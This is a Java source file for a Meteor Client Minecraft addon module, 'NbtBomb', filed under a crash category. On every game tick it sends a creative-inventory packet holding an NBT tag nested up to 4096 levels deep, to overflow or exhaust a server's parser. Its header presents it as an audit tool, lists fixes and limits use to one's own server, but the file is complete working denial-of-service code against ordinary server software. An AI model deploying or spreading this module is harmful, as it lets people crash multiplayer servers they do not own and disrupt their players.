package com.example.addon.modules.crash;

import com.example.addon.AddonTemplate;
import meteordevelopment.meteorclient.events.game.GameLeftEvent;
import meteordevelopment.meteorclient.events.world.TickEvent;
import meteordevelopment.meteorclient.settings.BoolSetting;
import meteordevelopment.meteorclient.settings.IntSetting;
import meteordevelopment.meteorclient.settings.Setting;
import meteordevelopment.meteorclient.settings.SettingGroup;
import meteordevelopment.meteorclient.systems.modules.Module;
import meteordevelopment.orbit.EventHandler;
import net.minecraft.component.DataComponentTypes;
import net.minecraft.component.type.NbtComponent;
import net.minecraft.item.ItemStack;
import net.minecraft.item.Items;
import net.minecraft.nbt.NbtCompound;
import net.minecraft.network.packet.c2s.play.CreativeInventoryActionC2SPacket;

/**
 * AUDIT: NBT Bomb (deeply-nested CompoundTag → parser recursion / OOM)
 *
 * Sends CreativeInventoryActionC2SPacket with a CUSTOM_DATA component
 * containing a deeply-nested NbtCompound ({n:{n:{n:…}}} × depth levels).
 * Tests the NBT parser's recursion-depth cap:
 *
 *   - A parser without a depth limit will recurse N stack frames deep,
 *     potentially overflowing the JVM stack at ~500–2000 levels depending
 *     on stack size.
 *   - Even with a stack cap, building a Java object tree N levels deep
 *     before rejecting allocates O(N) objects — at 4096 levels this is
 *     measurable memory pressure per packet per tick.
 *
 * Requires creative mode. A server that doesn't limit NBT depth before
 * deserialisation will crash or OOM under sustained fire from this module.
 *
 * Patch signal: cap NBT compound nesting depth at decode time (Paper caps at
 * 512); count nesting at the byte-stream level before allocating Java objects;
 * reject deeply-nested payloads with a graceful disconnect, not an exception.
 *
 * Requires creative mode. Run against your OWN local server only.
 */
public class NbtBomb extends Module {
    private final SettingGroup sgGeneral = this.settings.getDefaultGroup();

    private final Setting<Integer> depth = sgGeneral.add(new IntSetting.Builder()
        .name("depth").description("Nesting levels in the NbtCompound tree.")
        .defaultValue(512).range(1, 4096).sliderRange(1, 1024).build()
    );
    private final Setting<Boolean> autoDisable = sgGeneral.add(new BoolSetting.Builder()
        .name("auto-disable").description("Disable when kicked from the server.")
        .defaultValue(true).build()
    );
    private final Setting<Boolean> showStats = sgGeneral.add(new BoolSetting.Builder()
        .name("show-stats").description("Print tick + packet count on deactivate.")
        .defaultValue(true).build()
    );

    private int ticksActive = 0, packetsSent = 0;

    public NbtBomb() {
        super(AddonTemplate.CRASH_CATEGORY, "nbt-bomb",
            "Sends a deeply-nested NBT tag via creative slot packet. Requires creative mode.");
    }

    @EventHandler
    private void onTick(TickEvent.Pre event) {
        ticksActive++;
        if (mc.player == null || !mc.player.getAbilities().creativeMode) return;
        NbtCompound root = buildNestedTag(depth.get());
        ItemStack stack = new ItemStack(Items.STONE);
        stack.set(DataComponentTypes.CUSTOM_DATA, NbtComponent.of(root));
        mc.player.networkHandler.sendPacket(new CreativeInventoryActionC2SPacket(36, stack));
            packetsSent++;
    }

    private static NbtCompound buildNestedTag(int levels) {
        NbtCompound current = new NbtCompound();
        for (int i = 0; i < levels; i++) {
            NbtCompound parent = new NbtCompound();
            parent.put("n", current);
            current = parent;
        }
        return current;
    }

    @Override
    public void onDeactivate() {
        if (showStats.get()) info("Summary: %d ticks active, %d packets sent.", ticksActive, packetsSent);
    }

    @EventHandler
    private void onGameLeft(GameLeftEvent event) {
        if (autoDisable.get() && isActive()) toggle();
    }
}
